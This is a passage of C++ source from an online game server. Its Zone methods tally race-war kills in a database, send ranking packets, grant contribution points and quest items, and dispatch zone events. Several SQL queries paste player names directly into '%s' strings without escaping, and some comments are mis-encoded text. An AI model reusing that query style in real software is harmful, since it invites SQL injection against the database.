		return 0;
} 

void    Zone::giveHolyWarContributePoint()
throw(Error)
{
	__BEGIN_TRY


		map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			try {
				Creature* pCreature = itr->second;
				Player* pPlayer = pCreature->getPlayer();
				Assert(pPlayer != NULL);

				GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

				float BloodBibleWinPoint = g_pShrineInfoManager->getBloodBibleWinPoint(pPC->getRace());
				int ContributePoint = 500.0 * ( 1.0 + BloodBibleWinPoint / 5.0 ) * ( ( 1.0 + ( (float)pPC->getHolyWarCheckPoint() - 1.0 ) * 0.1 ) ) ;

				ContributePoint = getPercentValue(ContributePoint, g_pVariableManager->getVariable( CONTRIBUTE_POINT_BONUS )); 
				cout << "BloodBibleWinPoint : " << BloodBibleWinPoint << endl;
				cout << "pPC->getHolyWarCheckPoint() : " << pPC->getHolyWarCheckPoint() << endl;
				cout << "ContributePoint : " << ContributePoint << endl;

				if(pPC->isSlayer())
				{
					Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
					Assert( pSlayer != NULL );

					SLAYER_RECORD prev;
					pSlayer->getSlayerRecord( prev );

					pPC->addContributePoint(1);

//					pSlayer->initAllStat();
					pSlayer->sendModifyInfo(prev);
				}
				else if(pPC->isVampire())
				{
					Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
					Assert( pVampire != NULL );

					VAMPIRE_RECORD prev;
					pVampire->getVampireRecord( prev );

					pPC->addContributePoint(1);

//					pVampire->initAllStat();
					pVampire->sendModifyInfo( prev );
				}
				else if(pPC->isOusters())
				{
					Ousters* pOusters = dynamic_cast<Ousters*>(pPC);
					Assert( pOusters != NULL );

					OUSTERS_RECORD prev;
					pOusters->getOustersRecord( prev );

					pPC->addContributePoint(1);

//					pOusters->initAllStat();
					pOusters->sendModifyInfo( prev );
				}
			} catch (Throwable& t) {
				cout << t.toString().c_str() << endl;
				filelog("ContributePointException.log", "%s", t.toString().c_str());
				//throw;
			}
		}

	__END_CATCH	
}

void    Zone::SendNewWarInfo()
throw(Error)
{
	__BEGIN_TRY


		map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			try {
				Creature* pCreature = itr->second;
				Player* pPlayer = pCreature->getPlayer();
				Assert(pPlayer != NULL);

				GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

////////////////////////////////////////////////////Race Info Start ///////////////////////////////////////////////////////////
				GCSendNewWarInfo gcSendNewWarInfo;

				uint slayerKillCount  = 0;
				uint vampireKillCount = 0;
				uint oustersKillCount = 0;

				uint slayerDeadCount  = 0;
				uint vampireDeadCount = 0;
				uint oustersDeadCount = 0;


				list<ItemType_t>     slayerBook;
				list<ItemType_t>     vampireBook;
				list<ItemType_t>     oustersBook;

				Statement* pStmt    = NULL;
				Result*    pResult  = NULL;
	
				BEGIN_DB
				{
					pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();
					pResult = pStmt->executeQuery("SELECT Race, SUM(KillCount), SUM(DeadCount) FROM NewWarLog GROUP BY Race");

					while (pResult->next())
					{
						uint race = pResult->getInt(1);
						uint KillCount  = pResult->getInt(2);
						uint DeadCount  = pResult->getInt(3);

						if ( race == 0 )
							{
								slayerKillCount = KillCount;
								slayerDeadCount = DeadCount;
							}
						else if ( race == 1 )
							{
								vampireKillCount = KillCount;
								vampireDeadCount = DeadCount;
							}
						else if ( race == 2 )
							{
								oustersKillCount = KillCount;
								oustersDeadCount = DeadCount;
							}
					}
		
					SAFE_DELETE(pStmt);
				}
				END_DB(pStmt)

				Statement* pStmt2 = NULL;
				Result* pResult2  = NULL;

				BEGIN_DB
				{
					pStmt2 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();

					pResult2 = pStmt2->executeQuery("SELECT ID, OwnerRace FROM ShrineInfo");

					while (pResult2->next())
					{
						uint id   		= pResult2->getInt(1);
						uint ownerRace	= pResult2->getInt(2);

						if ( ownerRace == 0 )
							{
								slayerBook.push_back(id);
							}
						else if ( ownerRace == 1 )
							{
								vampireBook.push_back(id);
							}
						else if ( ownerRace == 2 )
							{
								oustersBook.push_back(id);
							}
					}

					SAFE_DELETE( pStmt2 );
				}
				END_DB(pStmt2)

				int SlayerBookCount = slayerBook.size();
				int SlayerPoint = SlayerBookCount*500;

				int vampireBookCount = vampireBook.size();
				int vampirePoint = vampireBookCount*500;

				int oustersBookCount = oustersBook.size();
				int oustersPoint = oustersBookCount*500;

				RaceData* pGI = new RaceData();
				pGI->BookCount = SlayerBookCount;
				pGI->RaceBookType =  slayerBook;
				pGI->RaceKillCount = slayerKillCount;
				pGI->RaceDeadCount = slayerDeadCount;
				pGI->RacePoint = SlayerPoint;
				gcSendNewWarInfo.addRaceData(pGI);

				RaceData* pGII = new RaceData();
				pGII->BookCount = vampireBookCount;
				pGII->RaceBookType =  vampireBook;
				pGII->RaceKillCount = vampireKillCount;
				pGII->RaceDeadCount = vampireDeadCount;
				pGII->RacePoint = vampirePoint;
				gcSendNewWarInfo.addRaceData(pGII);

				RaceData* pGIII = new RaceData();
				pGIII->BookCount = oustersBookCount;
				pGIII->RaceBookType =  oustersBook;
				pGIII->RaceKillCount = oustersKillCount;
				pGIII->RaceDeadCount = oustersDeadCount;
				pGIII->RacePoint = oustersPoint;
				gcSendNewWarInfo.addRaceData(pGIII);
/////////////////////////////////////////////////////////////////////////Rank List Start/////////////////////////////////////////////////////////////////

				Statement* pStmt3 = NULL;
				Result* pResult3  = NULL;

				BEGIN_DB
				{
					pStmt3 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();

					pResult3 = pStmt3->executeQuery("SELECT Name,KillCount,DeadCount FROM NewWarLog WHERE Race = '0' ORDER BY KillCount DESC LIMIT 10");

					while (pResult3->next())
					{

						int Playerkillcount = pResult3->getInt(2);
						int Playerdeadcount = pResult3->getInt(3);
						int secPoint;
						if(Playerdeadcount >= Playerkillcount)
						{
							secPoint = 0;
						}
						else
						{
							secPoint = Playerkillcount - Playerdeadcount;
						}
	
						ScoreListSlayer* pScoreList = new ScoreListSlayer();

						pScoreList->RankName 	    = pResult3->getString(1);
						pScoreList->RankKillCount = Playerkillcount;
						pScoreList->RankDeadCount = Playerdeadcount;
						pScoreList->RankPoint     = secPoint*10;

						gcSendNewWarInfo.addScoreListSlayer(pScoreList);			
					}

					SAFE_DELETE( pStmt3 );
				}
				END_DB(pStmt3)

				Statement* pStmt4 = NULL;
				Result* pResult4  = NULL;

				BEGIN_DB
				{
					pStmt4 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();

					pResult4 = pStmt4->executeQuery("SELECT Name,KillCount,DeadCount  FROM NewWarLog WHERE Race = '1' ORDER BY KillCount DESC LIMIT 10");

					while (pResult4->next())
					{

						int Playerkillcount = pResult4->getInt(2);
						int Playerdeadcount = pResult4->getInt(3);
						int secPoint;
						if(Playerdeadcount >= Playerkillcount)
						{
							secPoint = 0;
						}
						else
						{
							secPoint = Playerkillcount - Playerdeadcount;
						}

						ScoreListVampire* pScoreListt = new ScoreListVampire();

						pScoreListt->RankName 	    = pResult4->getString(1);
						pScoreListt->RankKillCount = Playerkillcount;
						pScoreListt->RankDeadCount = Playerdeadcount;
						pScoreListt->RankPoint     = secPoint*10;

						gcSendNewWarInfo.addScoreListVampire(pScoreListt);			
					}

					SAFE_DELETE( pStmt4 );
				}
				END_DB(pStmt4)

				Statement* pStmt5 = NULL;
				Result* pResult5  = NULL;

				BEGIN_DB
				{
					pStmt5 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();

					pResult5 = pStmt5->executeQuery("SELECT Name,KillCount,DeadCount  FROM NewWarLog WHERE Race = '2' ORDER BY KillCount DESC LIMIT 10");

					while (pResult5->next())
					{


						int Playerkillcount = pResult5->getInt(2);
						int Playerdeadcount = pResult5->getInt(3);
						int secPoint;
						if(Playerdeadcount >= Playerkillcount)
						{
							secPoint = 0;
						}
						else
						{
							secPoint = Playerkillcount - Playerdeadcount;
						}

						ScoreListOusters* pScoreListtt = new ScoreListOusters();

						pScoreListtt->RankName 	    = pResult5->getString(1);
						pScoreListtt->RankKillCount = Playerkillcount;
						pScoreListtt->RankDeadCount = Playerdeadcount;
						pScoreListtt->RankPoint     = secPoint*10;

						gcSendNewWarInfo.addScoreListOusters(pScoreListtt);			
					}

					SAFE_DELETE( pStmt5 );
				}
				END_DB(pStmt5)
///////////////////////////////////////////////////Rank List End/////////////////////////////////////////////////

/////////////////////////////////////////////////////player start///////////////////////////////////////////////
				Statement* pStmt6 = NULL;
				Result* pResult6  = NULL;

				BEGIN_DB
				{
					pStmt6 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();

					pResult6 = pStmt6->executeQuery("SELECT KillCount,DeadCount FROM NewWarLog WHERE Name='%s'",
									pPC->getName().c_str());

					while (pResult6->next())
					{

							int Playerkillcount = pResult6->getInt(1);
							int Playerdeadcount = pResult6->getInt(2);
							int secPoint;
							if(Playerdeadcount >= Playerkillcount)
							{
								secPoint = 0;
							}
							else
							{
								secPoint = Playerkillcount - Playerdeadcount;
							}

							gcSendNewWarInfo.setPlayerKillCount(Playerkillcount);
							gcSendNewWarInfo.setPlayerDeadCount(Playerdeadcount);

						if(pPC->isSlayer())
						{
							gcSendNewWarInfo.setPlayerRacePoint( SlayerPoint );

							gcSendNewWarInfo.setPlayerKillPoint( secPoint*10 );

							gcSendNewWarInfo.setPlayerTotalPoint( SlayerPoint + secPoint*10 );

							Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
							Assert( pSlayer != NULL );

							SLAYER_RECORD prev;
							pSlayer->getSlayerRecord( prev );

							pPC->addContributePoint(SlayerPoint + secPoint*10);

							pSlayer->sendModifyInfo(prev);
						}
						else if(pPC->isVampire())
						{
							gcSendNewWarInfo.setPlayerRacePoint( vampirePoint );
							gcSendNewWarInfo.setPlayerKillPoint( secPoint*10  );
							gcSendNewWarInfo.setPlayerTotalPoint( vampirePoint + secPoint*10 );	

							Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
							Assert( pVampire != NULL );

							VAMPIRE_RECORD prev;
							pVampire->getVampireRecord( prev );

							pPC->addContributePoint(vampirePoint + secPoint*10);

							pVampire->sendModifyInfo( prev );

						}
						else if(pPC->isOusters())
						{
							gcSendNewWarInfo.setPlayerRacePoint( oustersPoint );
							gcSendNewWarInfo.setPlayerKillPoint( secPoint*10 );
							gcSendNewWarInfo.setPlayerTotalPoint( oustersPoint + secPoint*10 );

							Ousters* pOusters = dynamic_cast<Ousters*>(pPC);
							Assert( pOusters != NULL );

							OUSTERS_RECORD prev;
							pOusters->getOustersRecord( prev );

							pPC->addContributePoint(oustersPoint + secPoint*10);

							pOusters->sendModifyInfo( prev );
	
						}		
					}

					SAFE_DELETE( pStmt6 );
				}
				END_DB(pStmt6)

				pPlayer->sendPacket(&gcSendNewWarInfo);

			} catch (Throwable& t) {
				//cout << t.toString().c_str() << endl;
				//filelog("ContributePointException.log", "%s", t.toString().c_str());
				//throw;
			}
		}

	__END_CATCH	
}

void    Zone::giveLevelWarContributePoint()
throw(Error)
{
	__BEGIN_TRY


		map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			try {
				Creature* pCreature = itr->second;
				Player* pPlayer = pCreature->getPlayer();
				Assert(pPlayer != NULL);

				GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

				float LevelWarWinPoint = m_pLevelWarManager->getSweeperWinPoint(pPC->getRace());
				int ContributePoint = 50.0 * ( 1.0 + LevelWarWinPoint / 5.0 ) * ( ( 1.0 + ( (float)pPC->getLevelWarCheckPoint() - 1.0) * 0.1 ) ) ;
				
				ContributePoint = getPercentValue(ContributePoint, g_pVariableManager->getVariable( CONTRIBUTE_POINT_BONUS ));
				
				if(pPC->isSlayer())
				{
					Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
					Assert( pSlayer != NULL );

					SLAYER_RECORD prev;
					pSlayer->getSlayerRecord( prev );

					pPC->addContributePoint(ContributePoint);

					//					pSlayer->initAllStat();
					pSlayer->sendModifyInfo(prev);
				}
				else if(pPC->isVampire())
				{
					Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
					Assert( pVampire != NULL );

					VAMPIRE_RECORD prev;
					pVampire->getVampireRecord( prev );

					pPC->addContributePoint(ContributePoint);

					//					pVampire->initAllStat();
					pVampire->sendModifyInfo( prev );
				}
				else if(pPC->isOusters())
				{
					Ousters* pOusters = dynamic_cast<Ousters*>(pPC);
					Assert( pOusters != NULL );

					OUSTERS_RECORD prev;
					pOusters->getOustersRecord( prev );

					pPC->addContributePoint(ContributePoint);

					//					pOusters->initAllStat();
					pOusters->sendModifyInfo( prev );
				}

			} catch (Throwable& t) {
				cout << t.toString().c_str() << endl;
				filelog("ContributePointException.log", "%s", t.toString().c_str());
				//throw;
			}
		}

	__END_CATCH	
}

void    Zone::giveLevelWarReward()
throw(Error)
{
	__BEGIN_TRY


		map< ObjectID_t, Creature* > & creatures = m_pPCManager->getCreatures();
		map< ObjectID_t, Creature* >::iterator itr = creatures.begin();

		for (; itr!=creatures.end(); itr++)
		{
			try {
				Creature* pCreature = itr->second;
				Player* pPlayer = pCreature->getPlayer();
				Assert(pPlayer != NULL);

				GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pPlayer);

				PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
				Assert(pPC!=NULL);

				VSDateTime dt = VSDateTime::currentDateTime();
				int secsLast = pPC->getLevelWarCheckDate().secsTo(dt);
				if(secsLast < 1200)
					continue;

				Inventory* pInventory = pPC->getInventory();

				Grade_t grade;
				ItemType_t createItemType;

				do
				{
					Item* pItem = NULL;
					// ¡¥ž ³ŸîŽ.
					list<OptionType_t> nullList;
					if(pPC->isSlayer())
					{
						createItemType = 15 + (m_pLevelWarManager->getLevel() * 3);
					}
					else if(pPC->isVampire())
					{
						createItemType = 16 + (m_pLevelWarManager->getLevel() * 3);
					}
					else if(pPC->isOusters())
					{
						createItemType = 17 + (m_pLevelWarManager->getLevel() * 3);
					}

					pItem = g_pItemFactoryManager->createItem(Item::ITEM_CLASS_COMMON_QUEST_ITEM, createItemType, nullList);
					pItem->setGrade(grade);

					ItemInfo* pItemInfo = g_pItemInfoManager->getItemInfo(Item::ITEM_CLASS_COMMON_QUEST_ITEM, createItemType);
					// º¥äž® °°º Ÿ Žö £ŽŽ.
					_TPOINT pt;
					// º¥äž®¿¡ ³Ÿî  Ÿ °ø°£ Žö © Ž.
					if( !pInventory->getEmptySlot( pItem, pt) )
					{
						char msg[128];
						sprintf(msg, g_pStringPool->c_str(STRID_NOT_ENOUGH_INVENTORY_SPACE_NOT_GET_ITEM), pItemInfo->getName().c_str()); 
						GCSystemMessage gcSystemMessage;
						gcSystemMessage.setMessage(msg);
						pPC->getPlayer()->sendPacket(&gcSystemMessage);
						break;
					}


					(getObjectRegistry()).registerObject(pItem);

					if( pInventory->addItem( pItem, pt ) )
					{
						pItem->create( pPC->getName(), STORAGE_INVENTORY, 0, pt.x, pt.y );
						filelog( "LevelWar.log", "%s°¡ %sž ¹ŸŽŽ.", pPC->getName().c_str(), pItemInfo->getName().c_str());

						remainTraceLog( pItem, "LevelWar", pPC->getName(), ITEM_LOG_CREATE, DETAIL_PICKUP );
						
						GCCreateItem gcCreateItem;
						makeGCCreateItem(&gcCreateItem, pItem, pt.x, pt.y);

						pPlayer->sendPacket( &gcCreateItem );
					}
					else
					{
						pInventory->deleteItem( pItem->getObjectID() );
						char msg[128];
						sprintf(msg, g_pStringPool->c_str(STRID_NOT_ENOUGH_INVENTORY_SPACE_NOT_GET_ITEM), pItemInfo->getName().c_str());
						GCSystemMessage gcSystemMessage;
						gcSystemMessage.setMessage(msg);
						pPC->getPlayer()->sendPacket(&gcSystemMessage);
						break;
					}

				}while(false);

			} catch (Throwable& t) {
				cout << t.toString().c_str() << endl;
				filelog("ContributePointException.log", "%s", t.toString().c_str());
				//throw;
			}
		}

	__END_CATCH	
}
#endif


void Zone::NotifyAttackCreature(Creature *pAttackerCreature, Creature *pDefenderCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyAttackCreature(pAttackerCreature, pDefenderCreature);
	}
	else
	{
		OnAttackCreature(pAttackerCreature, pDefenderCreature);
	}	
}

void Zone::NotifyKillCreature(Creature *pAttackerCreature, Creature *pDeadCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyKillCreature(pAttackerCreature, pDeadCreature);
	}
	else
	{
		OnKillCreature(pAttackerCreature, pDeadCreature);
	}
}
void Zone::NotifyPK(Creature *pAttackerCreature, Creature *pDeadCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyPK(pAttackerCreature, pDeadCreature);
	}
	else
	{
		OnPK(pAttackerCreature, pDeadCreature);


		if ( isHolyLand())

			{
				if(g_pWarSystem->hasActiveRaceWar())
				  {
     					if(pAttackerCreature->isPC() && pDeadCreature->isPC() && pAttackerCreature !=NULL &&  pDeadCreature !=NULL )				
						{
							if(pAttackerCreature->getRace() != pDeadCreature->getRace())
								{
									PlayerCreature* killer = dynamic_cast<PlayerCreature*>(pAttackerCreature);
									Assert( killer != NULL );
									PlayerCreature* deader = dynamic_cast<PlayerCreature*>(pDeadCreature);
									Assert( deader != NULL );
									int num =0;

									Statement* pStmt = NULL;
									BEGIN_DB
									{
										pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();		
		
										Result* pResult = pStmt->executeQuery("SELECT Name,KillCount FROM NewWarLog WHERE Name = '%s'", killer->getName().c_str());

										if(pResult->next())

										{
											num = pResult->getInt(2);
											pStmt->executeQuery("UPDATE NewWarLog SET KillCount=KillCount+1 WHERE Name = '%s'", killer->getName().c_str());

											char race[15];
											if ( killer->isSlayer() )
											{
												sprintf( race, g_pStringPool->c_str( STRID_SLAYER ) );
											}
											else if ( killer->isVampire() )
											{
												sprintf( race, g_pStringPool->c_str( STRID_VAMPIRE ) );
											}
											else if ( killer->isOusters() )
											{
												sprintf( race, g_pStringPool->c_str( STRID_OUSTERS ) );
											}
											else
											{
												Assert(false);
											}		
	
											char msg[100];
											GCSystemMessage gcSystemMessage;
											switch (num)
											{
												case 10:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_10 ) ,
																race,
																killer->getName().c_str()
																);
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;		
												case 50:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_50 ) ,
														race,
														killer->getName().c_str()
														);
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 100:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_100 ) ,
														race,
														killer->getName().c_str()
														);
														//GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;

												case 200:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_200 ) ,
														race,
														killer->getName().c_str()
														);
														//GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 300:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_300 ) ,
														race,
														killer->getName().c_str()
														);
														//GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 400:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_400 ) ,
														race,
														killer->getName().c_str()
														);
														//GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 500:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_500 ) ,
														race,
														killer->getName().c_str()
														);
													//	GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 600:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_600 ) ,
														race,
														killer->getName().c_str()
														);
													//	GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 700:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_700 ) ,
														race,
														killer->getName().c_str()
														);
													//	GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 800:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_800 ) ,
														race,
														killer->getName().c_str()
														);
													//	GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 900:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_900 ) ,
														race,
														killer->getName().c_str()
														);
													//	GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
												case 1000:
														sprintf( msg , g_pStringPool->c_str( STRID_WAR_KILL_COUNT_1000 ) ,
														race,
														killer->getName().c_str()
														);
														//GCSystemMessage gcSystemMessage;
														gcSystemMessage.setType( SYSTEM_MESSAGE_EVENT );
														gcSystemMessage.setMessage( msg );
														broadcastPacket( &gcSystemMessage );
														break;
											}

										}
										else
										{
										pStmt->executeQuery("INSERT INTO NewWarLog (Name,Race, KillCount, DeadCount) VALUES ('%s',%d, 1, 0)",
													killer->getName().c_str(),
													(int)killer->getRace()
													);
										}
				
										SAFE_DELETE(pStmt);
									}
									END_DB(pStmt)


									Statement* pStmt2 = NULL;
									BEGIN_DB
									{
										pStmt2 = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();		
		
										Result* pResult2 = pStmt2->executeQuery("SELECT Name FROM NewWarLog WHERE Name = '%s'", deader->getName().c_str());

										if(pResult2->next())

										{

											pStmt2->executeQuery("UPDATE NewWarLog SET DeadCount=DeadCount+1 WHERE Name = '%s'", deader->getName().c_str());

										}
										else
										{
											pStmt2->executeQuery("INSERT INTO NewWarLog (Name,Race, KillCount, DeadCount) VALUES ('%s',%d, 0, 1)",
													deader->getName().c_str(),
													(int)deader->getRace()
													);
										}
				
										SAFE_DELETE(pStmt2);
									}
									END_DB(pStmt2)
							
								}
						}
				}
			}
	}
}
bool Zone::NotifyBeforeEnterZone(Creature *pCreature)
{
	bool bResult;
	
	if ( isDynamicZone() )
	{
		bResult = getDynamicZone()->NotifyBeforeEnterZone(pCreature);
		
		{
			char strLog[256];
			sprintf(strLog, 
				"DynamicZone : before enter, ZoneID=%d, Creature=%s, EnterResult=%d",
				getZoneID(),
				pCreature->getName().c_str(),
				bResult
			);	
			filelog("CreateDynamicZone.log", strLog);
		}
		
		if ( bResult )
		{
			if (pCreature->isSlayer())
			{
				Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
				
				if (pSlayer->hasRideMotorcycle())
				{
					pSlayer->getOffMotorcycle();

					GCGetOffMotorCycle _GCGetOffMotorCycle;
					_GCGetOffMotorCycle.setObjectID(pSlayer->getObjectID());
					
					broadcastPacket(pSlayer->getX(), pSlayer->getY(), &_GCGetOffMotorCycle);
				}
				
				SkillHandler* pSkillHandler = g_pSkillHandlerManager->getSkillHandler(SKILL_UN_TRANSFORM);
				if ( pSkillHandler != NULL )
				{
					pSkillHandler->execute(pSlayer, NULL, (CEffectID_t)0);
				}
			}
			else if (pCreature->isVampire())
			{
				Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
				
				SkillHandler* pSkillHandler = g_pSkillHandlerManager->getSkillHandler(SKILL_UN_TRANSFORM);
				if ( pSkillHandler != NULL )
				{
					pSkillHandler->execute(pVampire);
				}
			}
			else if (pCreature->isOusters())
			{
				Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
				
				SkillHandler* pSkillHandler = g_pSkillHandlerManager->getSkillHandler(SKILL_UN_TRANSFORM);
				if ( pSkillHandler != NULL )
				{
					pSkillHandler->execute(pOusters);
				}
			}
		}
	}
	else
	{
		bResult = OnBeforeEnterZone(pCreature);
	}
	
	return bResult;
}

void Zone::NotifyAfterEnterZone(Creature *pCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyAfterEnterZone(pCreature);
		
		{
			char strLog[256];
			sprintf(strLog, 
				"DynamicZone : after enter, ZoneID=%d, Creature=%s",
				getZoneID(),
				pCreature->getName().c_str()
			);	
			filelog("CreateDynamicZone.log", strLog);
		}
	}
	else
	{
		OnAfterEnterZone(pCreature);

		if ( isHolyLand())

			{
				if(g_pWarSystem->hasActiveRaceWar())
				  {
					if(pCreature->isPC())
					{

						PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
						Assert( pPC != NULL );

						Statement* pStmt = NULL;

						BEGIN_DB
						{
							pStmt = g_pDatabaseManager->getDistConnection("PLAYER_DB")->createStatement();		
		
							Result* pResult = pStmt->executeQuery("SELECT Name FROM NewWarLog WHERE Name = '%s'", pPC->getName().c_str());

							if( pResult->getRowCount() == 0)
							{

								pStmt->executeQuery("INSERT INTO NewWarLog (Name,Race, KillCount, DeadCount) VALUES ('%s',%d, 0, 0)",
											pPC->getName().c_str(),
											(int)pCreature->getRace()
											);

							}
				
							SAFE_DELETE(pStmt);
						}
						END_DB(pStmt)
					}
				}
			}
	}
}

void Zone::NotifyBeforeLeaveZone(Creature *pCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyBeforeLeaveZone(pCreature);
		
		{
			char strLog[256];
			sprintf(strLog, 
				"DynamicZone : before leave, ZoneID=%d, Creature=%s",
				getZoneID(),
				pCreature->getName().c_str()
			);	
			filelog("CreateDynamicZone.log", strLog);
		}
	}
	else
	{
		OnBeforeLeaveZone(pCreature);
	}
}

void Zone::NotifyAfterLeaveZone(Creature *pCreature)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyAfterLeaveZone(pCreature);
		
		{
			char strLog[256];
			sprintf(strLog, 
				"DynamicZone : after leave, ZoneID=%d, Creature=%s",
				getZoneID(),
				pCreature->getName().c_str()
			);	
			filelog("CreateDynamicZone.log", strLog);
		}
	}
	else
	{
		OnAfterLeaveZone(pCreature);
	}
}

void Zone::NotifyAddMonster(Monster *pMonster)
{
	if ( isDynamicZone() )
	{
		getDynamicZone()->NotifyAddMonster(pMonster);
	}
	else
	{
		OnAddMonster(pMonster);
	}
}

bool Zone::NotifyResurrectCreature(Creature *pCreature, ZONE_COORD& zoneCoord)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyResurrectCreature(pCreature, zoneCoord);
	}
	else
	{
		return OnResurrectCreature(pCreature, zoneCoord);
	}
}

bool Zone::NotifySay(Creature *pCreature, string& strMesg)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifySay(pCreature, strMesg);
	}
	else
	{
		return OnSay(pCreature, strMesg);
	}
}

bool Zone::NotifyUseItemInGear(Creature *pCreature, ItemClass_t ItemClass, ItemType_t ItemType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseItemInGear(pCreature, ItemClass, ItemType);
	}
	else
	{
		return OnUseItemInGear(pCreature, ItemClass, ItemType);
	}	
}

bool Zone::NotifyUseItemInInventory(Creature *pCreature, ItemClass_t ItemClass, ItemType_t ItemType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseItemInInventory(pCreature, ItemClass, ItemType);
	}
	else
	{
		return OnUseItemInInventory(pCreature, ItemClass, ItemType);
	}	
}

bool Zone::NotifyUseItemInQuick(Creature *pCreature, ItemClass_t ItemClass, ItemType_t ItemType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseItemInQuick(pCreature, ItemClass, ItemType);
	}
	else
	{
		return OnUseItemInQuick(pCreature, ItemClass, ItemType);
	}	
}


bool Zone::NotifyUseInventorySkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
		return getDynamicZone()->NotifyUseInventorySkill(pCreature, SkillType);
	}
	else
	{
		return OnUseInventorySkill(pCreature, SkillType);
	}	
}

bool Zone::NotifyUseObjectSkill(Creature *pCreature, SkillType_t SkillType)
{
	if ( isDynamicZone() )
	{
